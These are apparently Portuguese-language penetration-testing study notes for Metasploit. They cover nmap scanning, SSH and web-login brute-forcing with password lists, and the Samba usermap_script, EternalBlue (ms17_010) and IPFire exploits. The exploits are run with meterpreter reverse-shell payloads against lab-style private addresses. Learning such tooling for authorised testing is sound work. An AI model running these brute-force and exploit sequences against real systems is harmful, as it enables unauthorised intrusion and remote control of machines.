##   Metasploit Framework

base de dados do metasploit

`msfdb`

*Obs: Antes de inicializar a base dedados lembre-se de atualizar seu sistema.

veriricando status 

`msfdb status`

inicializando postgress

`systemctl start postgresql`

Inicializando

`msfdb init`

inicializando metasploit

`msfconsole`


## Módulos Auxiliares

Exibindo informações

`show -h`

utilizando search

`search -h`

`search ...`

`search type:....`

Utilizando o NMAP no metasploit

`db_nmap -v --open -sV -Pn 192.168.0.1`

Exportando dados do NMAP para posteriormente ser usado no metasploit

`nmap -v --open -sV -Pn 192.168.0.1 -oX /opt/host4.xml`

Importando para o metasploit

`db_import /opt/host4.xml`

Listando informações

`service`

`service -p 21`

`hosts`

`vulns`

## Ataques de força bruta

`search type:auxiliary ssh`

`use auxiliary/scanner/ssh/ssh_login`

`show options`

`nano /opt/users.txt`

`nano /opt/pass.txt`

`set RHOST 192.168.0.1`

`set THREADS 10`

`set USER_FILE /opt/users.txt`

`set PASS_FILE /opt/pass.txt`

`set VERBOSE true`

`run`

`sessions` 

`sessions -i 1`

`creds`

## Levantamento de Informações

`db_nmap -p 139,445 --open -Pn -sS 192.168.0/24`

`services`

`services -p 139`

`services -p 445`

`search type:auxiliary smb`

`use auxiliary/scanner/smb/smb_version`

`info`

`service -p 445 --rhosts`

`show options`

`run`

`hosts`

## Identificando Vulnerabilidades

`vulns`

`hosts -i "Samba x.x.x" 192.168.0.1`

`search type:exploit samba`

*Obs: observe a coluna rank e verifique os exploits que são excellent, pois estes funcionam de forma perfeita.*

`search type:exploit fullname: "Samba 3.0.20" `

`search type:auxiliary smb`

`use auxiliary/scanner/smb/smb_ms17_010`

`services -p 445`

`services -p 445 --rhosts`

`show options`

`run`


## Explorando vulnerabilidade no Linux

`use exploit/multi/samba/usermap_script`

`info`

`exploit`

Listando payloads do exploit ativo:

`show payloads`


## Explorando vulnerabilidade no Windows

`search ms17_010`

`use exploit/windows/smb/ms17_010_eternalblue_win8`

`show options`

`set RHOSTS 192.168.0.1`

`show payloads`

*Obs: Caso você não defina o payload o exploit ira escolher de forma automática qual o melhor na quele momento.*

Exemplo para definir o payload:

`set payload windows/x64/meterpreter/reverse_tcp`

`exploit`

*Obs: Caso seja emitido algum erro ao exeuctar o exploit, analise a menssagem e observe se esta faltando alguma dependência (modulo) para que o exploit funcione de forma correta.*

Exemplo de instalação de Dependência

`apt search impacket`

`apt install impacket-scripts python-impacket python3-impacket`

Executando o exploit novamente apos instalar a dependẽncia

`exploit`

`help`


## Tipos de Payloads


windows/x64/meterpreter_reverse_tcp   -   Inline / non_staged

windows/x64/meterpreter/reverse_tcp   -   Staged


windows/shell_bind_tcp  -   Inline / non_staged

windows/shell/bind_tcp   -   Staged

windows/adduser   -   Inline / non_staged

linux/x86/adduser   -   Inline / non_staged

linux/x86/shell/reverse_tcp   -   Staged

linux/x86/shell_reverse_tcp -   Inline / non_staged


## Diferenças entre payloads (Rever)

Buscando vulnerabilidades

`db_nmap --open -p 445 192.168.0.1 --script=vuln -Pn`


## Mindset: Invadindo um firewall

Buscando portas abertas

msf5> `db_nmap --open -Pn -sV 192.168.0.1`

Listando hosts 

msf5> `hosts`

*Obs:Tente identificar qual o firewall é utilizado na aplicação, caso o firewall utilizado seja opensource você pode analisar toda a estrutura atraves dos repositorios oficiais, analisando seus principais componentes.*
- Faça testes eveja como a aplicação se comporta.
- 

IPFire

msf5> `search ipfire`

msf5> `auxiliary(scanner/http/http_login)`

msf5> `set RHOSTS 192.168.0.1`

msf5> `set RPORT 444`

msf5> `set SSL true`

msf5> `set STOP_ON_SUCESS yes`

msf5> `set PASS_FILE /opt/pass.txt`

msf5> `set USER_FILE /opt/users.txt`

msf5> `shoe options`

msf5>  `run`

-

msf5> `exploit(linux/http/ipfire_oinkcode_exec)`

msf5> `set PASSWORD security`

msf5> `set USERNAME admin`

msf5> `set LPORT 443`

msf5> `show options`

msf5> `exploit`














